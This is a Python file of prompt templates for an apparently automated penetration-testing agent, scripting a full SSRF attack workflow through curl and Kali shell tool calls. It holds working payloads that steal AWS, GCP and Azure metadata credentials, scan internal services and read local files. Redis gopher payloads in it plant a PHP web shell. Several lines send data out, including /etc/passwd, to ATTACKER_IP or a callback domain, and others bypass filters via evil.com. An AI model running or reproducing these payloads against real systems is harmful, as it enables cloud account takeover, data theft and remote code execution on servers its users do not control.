"""
RedAmon SSRF (Server-Side Request Forgery) Prompts

Prompts for SSRF attack workflows using SSRFmap, manual techniques, and OOB callbacks.
Covers cloud metadata extraction, internal network scanning, protocol smuggling, and blind SSRF.
"""


# =============================================================================
# SSRF MAIN WORKFLOW
# =============================================================================

SSRF_TOOLS = """
## ATTACK SKILL: SERVER-SIDE REQUEST FORGERY (SSRF)

**CRITICAL: This attack skill has been CLASSIFIED as SSRF.**
**You MUST follow the SSRF workflow below. Do NOT switch to other attack methods.**

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
Timeout:           {ssrf_timeout}s  (request timeout)
Follow redirects:  {ssrf_follow_redirects}  (follow HTTP redirects)
Cloud metadata:    {ssrf_cloud_metadata}  (test cloud metadata endpoints)
Protocol smuggle:  {ssrf_protocol_smuggle}  (test gopher/dict/file protocols)
Internal scan:     {ssrf_internal_scan}  (scan internal network ranges)
```

---

## MANDATORY SSRF WORKFLOW

### Step 1: Target Analysis (execute_curl)

Identify potential SSRF injection points:

1. **URL Parameters**: `?url=`, `?redirect=`, `?next=`, `?dest=`, `?path=`, `?file=`, `?page=`, `?feed=`, `?host=`, `?site=`
2. **Webhook/Callback URLs**: Integration settings, notification endpoints
3. **File/Image Fetchers**: Avatar uploads, URL imports, PDF generators, screenshot services
4. **Proxy Functionality**: Translation services, link previews, API gateways
5. **XML/SOAP endpoints**: External entity references, WSDL imports

**Test baseline behavior:**
```
execute_curl("-v 'TARGET_URL?url=http://example.com'")
```

Check response for:
- Does the server fetch the URL? (content returned, timing differences)
- Error messages revealing backend behavior
- Headers indicating proxy/fetch functionality

**After Step 1, request `transition_phase` to exploitation before proceeding to Step 2.**

### Step 2: Basic SSRF Detection (execute_curl)

**Test with external callback (Interactsh) to confirm SSRF exists:**

First set up Interactsh (see OOB Workflow below), then:

```
execute_curl("-v 'TARGET_URL?url=http://CALLBACK_DOMAIN/ssrf-test'")
```

If callback received → SSRF confirmed. If not, try:

**Common parameter names to test:**
```
url, uri, path, dest, redirect, next, data, reference, site, html, val, validate
domain, callback, return, page, feed, host, port, to, out, view, dir, show, file
document, folder, root, img, image, pic, link, src, source, fetch, proxy, request
```

**Localhost/Internal detection:**
```
execute_curl("-v 'TARGET_URL?url=http://127.0.0.1'")
execute_curl("-v 'TARGET_URL?url=http://localhost'")
execute_curl("-v 'TARGET_URL?url=http://[::1]'")
```

### Step 3: Cloud Metadata Extraction

**CRITICAL: Test for cloud metadata exposure - HIGH IMPACT**

**AWS EC2 (IMDSv1):**
```
execute_curl("-v 'TARGET_URL?url=http://169.254.169.254/latest/meta-data/'")
execute_curl("-v 'TARGET_URL?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'")
execute_curl("-v 'TARGET_URL?url=http://169.254.169.254/latest/user-data'")
```

**AWS EC2 (IMDSv2 - requires token):**
```
# IMDSv2 is harder - server needs to make 2 requests
# Usually blocked, but try anyway
execute_curl("-v 'TARGET_URL?url=http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'")
```

**Google Cloud (GCP):**
```
execute_curl("-v 'TARGET_URL?url=http://metadata.google.internal/computeMetadata/v1/' -H 'Metadata-Flavor: Google'")
execute_curl("-v 'TARGET_URL?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'")
```

**Azure:**
```
execute_curl("-v 'TARGET_URL?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true'")
execute_curl("-v 'TARGET_URL?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'")
```

**DigitalOcean:**
```
execute_curl("-v 'TARGET_URL?url=http://169.254.169.254/metadata/v1/'")
```

**Kubernetes:**
```
execute_curl("-v 'TARGET_URL?url=https://kubernetes.default.svc/api/v1/namespaces'")
execute_curl("-v 'TARGET_URL?url=http://169.254.169.254/latest/meta-data/eks/'")
```

### Step 4: Internal Network Scanning

**Scan internal IP ranges via SSRF:**

```
# Common internal ranges
execute_curl("-v 'TARGET_URL?url=http://10.0.0.1'")
execute_curl("-v 'TARGET_URL?url=http://172.16.0.1'")
execute_curl("-v 'TARGET_URL?url=http://192.168.1.1'")

# Common internal services
execute_curl("-v 'TARGET_URL?url=http://192.168.1.1:8080'")  # Web admin
execute_curl("-v 'TARGET_URL?url=http://10.0.0.1:6379'")     # Redis
execute_curl("-v 'TARGET_URL?url=http://10.0.0.1:27017'")    # MongoDB
execute_curl("-v 'TARGET_URL?url=http://10.0.0.1:9200'")     # Elasticsearch
execute_curl("-v 'TARGET_URL?url=http://10.0.0.1:5432'")     # PostgreSQL
execute_curl("-v 'TARGET_URL?url=http://10.0.0.1:3306'")     # MySQL
```

**Timing-based port detection:**
- Open port: fast response or specific error
- Closed port: connection refused (fast)
- Filtered port: timeout (slow)

### Step 5: Protocol Smuggling (if enabled)

**File protocol (read local files):**
```
execute_curl("-v 'TARGET_URL?url=file:///etc/passwd'")
execute_curl("-v 'TARGET_URL?url=file:///etc/hosts'")
execute_curl("-v 'TARGET_URL?url=file:///proc/self/environ'")
execute_curl("-v 'TARGET_URL?url=file://localhost/etc/passwd'")
```

**Gopher protocol (send raw TCP):**

Use for Redis command injection:
```
# Redis SLAVEOF (data exfil)
gopher://127.0.0.1:6379/_SLAVEOF%20ATTACKER_IP%206379

# Redis CONFIG SET (write file)
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0ACONFIG%20SET%20dbfilename%20shell.php%0ASET%20x%20"<?php%20system($_GET['cmd']);?>"%0ASAVE
```

Use for MySQL exploitation:
```
# Use Gopherus tool to generate payloads
kali_shell("gopherus --exploit mysql")
```

**Dict protocol (service enumeration):**
```
execute_curl("-v 'TARGET_URL?url=dict://127.0.0.1:6379/info'")
execute_curl("-v 'TARGET_URL?url=dict://127.0.0.1:11211/stats'")
```

### Step 6: Filter Bypass Techniques

**If basic payloads are blocked, try these bypasses:**

**URL Encoding:**
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74
```

**IP Address Formats:**
```
127.0.0.1 → 2130706433 (decimal)
127.0.0.1 → 0x7f000001 (hex)
127.0.0.1 → 0177.0.0.1 (octal)
127.0.0.1 → 127.1 (short form)
127.0.0.1 → 127.0.1 (short form)
127.0.0.1 → [::ffff:127.0.0.1] (IPv6 mapped)
127.0.0.1 → 0 (some systems)
```

**DNS Rebinding:**
```
# Use a DNS rebinding service that alternates between public and internal IP
# Example: 7f000001.c0a80001.rbndr.us resolves to 127.0.0.1 then 192.168.0.1
```

**Domain-based bypass:**
```
http://localtest.me  → resolves to 127.0.0.1
http://spoofed.burpcollaborator.net → use controlled DNS
http://attacker.com/redirect → 302 redirect to internal
```

**URL parser confusion:**
```
http://evil.com@127.0.0.1/
http://127.0.0.1#@evil.com/
http://127.0.0.1:80@evil.com/
http://evil.com\\@127.0.0.1/
```

### Step 7: Evidence Collection

For confirmed SSRF vulnerabilities:
1. Document the injection point (parameter, header, body)
2. Record successful payloads
3. List accessible internal services/IPs
4. Save any cloud credentials/tokens extracted
5. Note filter bypass techniques that worked
6. Assess impact (cloud takeover, internal access, data exposure)
"""


# =============================================================================
# OOB (OUT-OF-BAND) SSRF WORKFLOW
# =============================================================================

SSRF_OOB_WORKFLOW = """
## OOB SSRF Workflow (Blind SSRF with Callback Server)

**Use this when:** Response doesn't show fetched content (blind SSRF),
or to confirm SSRF exists before deeper exploitation.
Requires `interactsh-client` installed in kali-sandbox.

---

### Setting Up Interactsh Callback Domain

**Step 1: Start interactsh-client as a background process**
```
kali_shell("interactsh-client -server oast.fun -json -v > /tmp/interactsh.log 2>&1 & echo $!")
```
-> **Save the PID** from the output for later cleanup.

**Step 2: Wait and read the registered domain**
```
kali_shell("sleep 5 && head -20 /tmp/interactsh.log")
```
-> Look for a line containing the `.oast.fun` domain (e.g., `abc123xyz.oast.fun`)
-> **IMPORTANT:** This domain is cryptographically registered with the server.
   Random strings will NOT work -- you MUST use the domain from this output.

**Step 3: Use the domain in SSRF payloads**

**Basic blind SSRF test:**
```
execute_curl("-v 'TARGET_URL?url=http://REGISTERED_DOMAIN/ssrf-test'")
```

**With path encoding for data exfil:**
```
# Exfiltrate hostname via DNS subdomain
execute_curl("-v 'TARGET_URL?url=http://$(hostname).REGISTERED_DOMAIN/'")
```

**DNS-only callback (bypasses HTTP-only filters):**
```
# Some SSRFs can make DNS lookups but not HTTP
execute_curl("-v 'TARGET_URL?url=http://dns-only-test.REGISTERED_DOMAIN/'")
```

**Step 4: Poll for interactions**
```
kali_shell("cat /tmp/interactsh.log | tail -50")
```
-> Look for JSON lines with `"protocol":"http"` or `"protocol":"dns"`
-> HTTP callback confirms full SSRF
-> DNS-only callback confirms partial SSRF (DNS resolution)

**Step 5: Advanced blind exploitation**

If blind SSRF confirmed, use OOB for data exfiltration:

**Exfil via DNS subdomain (base64):**
```
# On vulnerable server, data becomes DNS query
http://$(cat /etc/passwd | base64 | head -c 60).REGISTERED_DOMAIN/
```

**Exfil via HTTP path:**
```
http://REGISTERED_DOMAIN/exfil?data=$(cat /etc/passwd | base64)
```

**Step 6: Cleanup when done**
```
kali_shell("kill SAVED_PID")
```
"""


# =============================================================================
# SSRF PAYLOAD REFERENCE
# =============================================================================

SSRF_PAYLOAD_REFERENCE = """
## SSRF Payload Reference

### Cloud Metadata Endpoints

| Provider | Endpoint | Notes |
|----------|----------|-------|
| AWS | `http://169.254.169.254/latest/meta-data/` | IMDSv1, check for IAM creds |
| AWS | `http://169.254.169.254/latest/user-data` | May contain secrets |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Requires `Metadata-Flavor: Google` header |
| Azure | `http://169.254.169.254/metadata/instance` | Requires `Metadata: true` header |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | Direct access |
| Oracle Cloud | `http://169.254.169.254/opc/v1/instance/` | Direct access |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | China cloud |
| Kubernetes | `https://kubernetes.default.svc` | Service account tokens |

### Localhost Bypass Variations

```
# Standard
http://127.0.0.1
http://localhost
http://127.1

# IPv6
http://[::1]
http://[0000::1]
http://[::ffff:127.0.0.1]

# Decimal
http://2130706433  (127.0.0.1 as decimal)
http://017700000001  (127.0.0.1 as octal)

# Hex
http://0x7f000001
http://0x7f.0x00.0x00.0x01

# Mixed
http://127.0.0.1.nip.io
http://localtest.me
http://127.0.0.1.xip.io

# Redirect
http://attacker.com/redirect?url=http://127.0.0.1
```

### Protocol Handlers

| Protocol | Usage | Example |
|----------|-------|---------|
| `http://` | Standard web | `http://internal-api/` |
| `https://` | Secure web | `https://internal-api/` |
| `file://` | Local files | `file:///etc/passwd` |
| `gopher://` | Raw TCP | `gopher://127.0.0.1:6379/_INFO` |
| `dict://` | Dictionary | `dict://127.0.0.1:6379/info` |
| `ftp://` | FTP | `ftp://127.0.0.1/` |
| `sftp://` | SFTP | `sftp://127.0.0.1/` |
| `ldap://` | LDAP | `ldap://127.0.0.1/` |
| `tftp://` | TFTP | `tftp://127.0.0.1/file` |

### Internal Service Ports

| Port | Service | SSRF Value |
|------|---------|------------|
| 22 | SSH | Banner grab |
| 80/8080 | HTTP | Admin panels |
| 443/8443 | HTTPS | Admin panels |
| 3306 | MySQL | Gopher exploitation |
| 5432 | PostgreSQL | Connection attempt |
| 6379 | Redis | Command injection via Gopher |
| 9200 | Elasticsearch | Data access |
| 11211 | Memcached | Data access |
| 27017 | MongoDB | Data access |
| 5672 | RabbitMQ | Queue access |
| 2375 | Docker | Container escape |
| 10250 | Kubelet | K8s access |

### URL Parser Confusion

```
# Basic auth confusion
http://evil.com@127.0.0.1/

# Fragment confusion
http://127.0.0.1#@evil.com/

# Backslash confusion (Windows)
http://evil.com\\@127.0.0.1/

# Port confusion
http://127.0.0.1:80@evil.com/

# Mixed case (some parsers)
http://127.0.0.1/PATH → hTtP://127.0.0.1/path

# Unicode normalization
http://127.0.0.1/ⓔⓣⓒ/ⓟⓐⓢⓢⓦⓓ
```

### Gopherus Payloads (for gopher:// exploitation)

**Redis RCE:**
```bash
# Generate with: gopherus --exploit redis
gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0ASET%0D%0A$1%0D%0Ax%0D%0A$25%0D%0A<?php system($_GET[1]);?>%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A*1%0D%0A$4%0D%0ASAVE%0D%0A
```

**MySQL query execution:**
```bash
# Generate with: gopherus --exploit mysql
gopher://127.0.0.1:3306/_<URL_ENCODED_MYSQL_PACKET>
```

**FastCGI RCE:**
```bash
# Generate with: gopherus --exploit fastcgi
gopher://127.0.0.1:9000/_<URL_ENCODED_FASTCGI_PACKET>
```
"""
